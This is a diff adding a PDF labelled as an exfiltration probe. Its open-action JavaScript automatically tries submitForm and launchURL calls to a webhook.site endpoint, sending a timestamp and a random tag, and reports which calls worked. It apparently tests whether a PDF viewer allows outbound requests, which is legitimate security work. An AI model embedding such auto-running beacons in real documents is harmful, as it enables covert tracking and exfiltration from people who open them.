@@ -1,0 +1,95 @@
+%PDF-1.7
+% Exfil Probe PDF - Clean No-Navigator - Jan 2026
+1 0 obj
+<< /Type /Catalog
+   /Pages 2 0 R
+   /OpenAction 3 0 R
+>>
+endobj
+2 0 obj
+<< /Type /Pages
+   /Kids [4 0 R]
+   /Count 1
+>>
+endobj
+3 0 obj
+<< /Type /Action
+   /S /JavaScript
+   /JS (
+      try {
+        var ts = new Date().toISOString();
+        var rand = Math.random().toString(36).slice(2);
+        var exfil = "ts=" + ts + "&rand=" + rand + "&probe=powerapps-desktop";
+
+        var baseUrl = "https://webhook.site/4a931921-3bc2-4ad4-a5e7-1c30a652df1d?" + exfil;
+
+        var results = ["Exfil attempts (clean):"];
+
+        // Attempt 1: submitForm HTML
+        try {
+          this.submitForm({
+            cURL: baseUrl + "&type=html",
+            cSubmitAs: "HTML",
+            cCharset: "utf-8"
+          });
+          results.push("submitForm HTML: called (no throw)");
+        } catch(e) { results.push("submitForm HTML err: " + e); }
+
+        // Attempt 2: submitForm FDF
+        try {
+          this.submitForm({
+            cURL: baseUrl + "&type=fdf",
+            cSubmitAs: "FDF"
+          });
+          results.push("submitForm FDF: called (no throw)");
+        } catch(e) { results.push("submitForm FDF err: " + e); }
+
+        // Attempt 3: submitForm XML (variant)
+        try {
+          this.submitForm({
+            cURL: baseUrl + "&type=xml",
+            cSubmitAs: "XML"
+          });
+          results.push("submitForm XML: called (no throw)");
+        } catch(e) { results.push("submitForm XML err: " + e); }
+
+        // Attempt 4: launchURL fallback
+        try {
+          app.launchURL(baseUrl + "&type=launch", true);
+          results.push("launchURL: called (no throw)");
+        } catch(e) { results.push("launchURL err: " + e); }
+
+        app.alert(results.join("\\n"));
+      } catch (e) {
+        app.alert("Top-level error: " + e + "\\nDetails: " + (e.message || "no msg"));
+      }
+   )
+>>
+endobj
+4 0 obj
+<< /Type /Page
+   /Parent 2 0 R
+   /MediaBox [0 0 400 300]
+   /Contents 5 0 R
+>>
+endobj
+5 0 obj
+<< /Length 100 >>
+stream
+BT /F1 14 Tf 50 250 Td (Clean Exfil Test) Tj ET
+BT /F1 12 Tf 50 220 Td (Check webhook.site) Tj ET
+endstream
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000015 00000 n 
+0000000075 00000 n 
+0000000140 00000 n 
+0000000330 00000 n 
+0000000490 00000 n 
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+590
+%%EOF
